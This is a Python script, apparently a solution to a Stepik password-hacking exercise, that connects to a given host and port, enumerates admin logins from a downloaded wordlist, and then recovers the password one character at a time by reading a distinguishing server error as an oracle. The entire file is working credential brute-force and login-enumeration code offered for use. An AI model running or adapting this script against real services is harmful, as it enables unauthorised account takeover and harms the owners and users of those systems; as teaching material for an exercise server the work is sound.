import argparse
import socket
from urllib import request
import json
from string import printable


ADMIN_LOGINS = r'https://stepik.org/media/attachments/lesson/255258/logins.txt'
USER_PASSWORDS = r'https://stepik.org/media/attachments/lesson/255258/passwords.txt'


def get_data_from_url(url):
    data = request.urlopen(url)
    return map(str.strip, map(bytes.decode, data))


def find_login(sock):
    data = {"password": ""}
    for login in get_data_from_url(ADMIN_LOGINS):
        data["login"] = login
        sock.send(json.dumps(data).encode())
        response = json.loads(sock.recv(1024).decode())
        if response.get("result") in ("Wrong password!", "Exception happened during login"):
            return login


def find_password(sock, login):
    data = {"login": login}
    base = ''
    while True:
        for letter in printable:
            data["password"] = base + letter
            sock.send(json.dumps(data).encode())
            response = json.loads(sock.recv(1024).decode())
            if response.get("result") == "Connection success!":
                return base + letter
            if response.get("result") == "Exception happened during login":
                base = base + letter
                break


def connect(args):
    with socket.socket() as sock:
        sock.connect((args.hostname, args.port))
        login = find_login(sock)
        password = find_password(sock, login)
        data  = {"login": login, "password": password}
        print(json.dumps(data))


parser = argparse.ArgumentParser()
parser.add_argument('hostname')
parser.add_argument('port', type=int)
connect(parser.parse_args())